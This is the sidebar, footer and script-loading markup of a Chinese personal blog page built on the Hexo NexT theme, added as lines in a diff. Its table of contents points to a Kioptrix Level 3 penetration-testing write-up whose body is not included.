+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Kioptrix-Level-3"><span class="nav-text">Kioptrix Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试"><span class="nav-text">渗透测试</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/header.jpg"
+      alt="Sh4Nn0n">
+  <p class="site-author-name" itemprop="name">Sh4Nn0n</p>
+  <div class="site-description" itemprop="description">^.^</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fuziyuonly" title="GitHub &rarr; https://github.com/fuziyuonly" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://lingwu111.github.io/" title="https://lingwu111.github.io/" rel="noopener" target="_blank">lingwu</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sh4Nn0n</span>
+</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
